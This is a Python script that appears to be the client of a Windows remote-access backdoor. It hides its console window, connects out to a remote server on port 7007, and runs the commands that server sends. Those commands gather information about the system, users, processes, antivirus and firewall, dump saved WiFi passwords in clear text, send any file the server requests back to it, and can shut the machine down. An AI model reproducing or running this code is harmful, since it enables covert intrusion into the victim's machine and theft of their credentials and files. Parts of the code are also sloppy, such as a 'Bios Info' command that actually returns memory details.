import socket
import subprocess
import subprocess as sp
import os
import wmi
from win32com.client import GetObject
import ctypes

ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
s=socket.socket()
port=7007
#host = input(str("Enter Server Address:"))
host = str(' Enter remote device name') #// Enter Name of Server
s.connect((host, port))
print()
print("Connection established")
print()
while 1:
    command = s.recv(1024)
    command = command.decode()
    print("Command Received")
    print()
    if command == "Current Working Directory":
        files = os.getcwd()
        files = str(files)
        #s.send("".encode())
        print(files)
        s.send(files.encode())
        print("command has been executed successfully")
    
    elif command == "List all directories":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("command has been executed successfully")
    
    elif command == "Local Users":
        output = sp.getoutput('net users')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully") 
        
    elif command == "Local Groups":
        output = sp.getoutput('wmic group list brief')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")
        
    elif command == "System Accounts":
        output = sp.getoutput('wmic sysaccount list')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")

    elif command == "Active connections":
        output = sp.getoutput('netstat -n')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")    
    
    elif command == "Remote OS Version":
        output = sp.getoutput('wmic OS List brief')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")
    
    elif command == "Display Remote Processes":
        output = sp.getoutput('wmic process list brief')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")
    
    elif command == "loop":
        #output = sp.getoutput('tasklist')
        fruits = ["apple", "banana", "cherry"]
        result = []
        for x in fruits:
            #print(x)
            result.append(x)
        result = str(result)
        s.send(result.encode())
        print("command has been executed successfully")
    
    elif command == "Installed Aplications List":
        output = sp.getoutput('wmic product get name,version')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")    
    
    elif command == "Physical Memory":
        output = sp.getoutput('wmic memorychip list full')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")
        
    elif command == "Bios Info":
        output = sp.getoutput('wmic memorychip list full')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")
    
    elif command == "CPU Details":
        output = sp.getoutput('wmic cpu list full')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")
    
    elif command == "Remote Antivirus":
        objWMI = GetObject('winmgmts:\\\\.\\root\\SecurityCenter2').InstancesOf('AntiVirusProduct')
        for obj in objWMI:
            if obj.displayName != None:
                x = str(obj.displayName)
        #output = str(output)
        s.send(x.encode())
        print("command has been executed successfully")
    
    elif command == "WiFi Details":
        output = sp.getoutput('netsh wlan show profile * key=clear')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")
    
    elif command == "Display Remote Services":
        completed = subprocess.run(["powershell", "Get-Service -Name *"], capture_output=True)
        #output = sp.getoutput('Get-Service -Name *')
        output = completed
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")
        
    elif command == "Installed Updated":
        output = sp.getoutput('wmic qfe list brief')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")
        
    elif command == "Startup Details":
        output = sp.getoutput('wmic startup list full')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")
        
    elif command == "Hardisk and Filesystem":
        output = sp.getoutput('wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")
        
    elif command == "Missing OS Patches":
        output = sp.getoutput('wmic qfe list')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")
        
    elif command == "Firewall Status":
        output = sp.getoutput('netsh advfirewall show currentprofile')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")
        
    elif command == "Firewall Rules":
        output = sp.getoutput('netsh advfirewall firewall show rule name=all')
        output = str(output)
        s.send(output.encode())
        print("command has been executed successfully")
        
    elif command == "Shutdown":
        os.system('shutdown -s -t 30')
        #output = str(output)
        #s.send(output.encode())
        #print("command has been executed successfully")
        
    elif command == "Download File":
        file_path = s.recv(7000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data)
        print("File sent successfully")
    
    elif command == "exit":
        exit()
        #output = str(output)
        #s.send(output.encode())
        #print("command has been executed successfully")
        
    else:
        print("Wrong Command")
        
        
        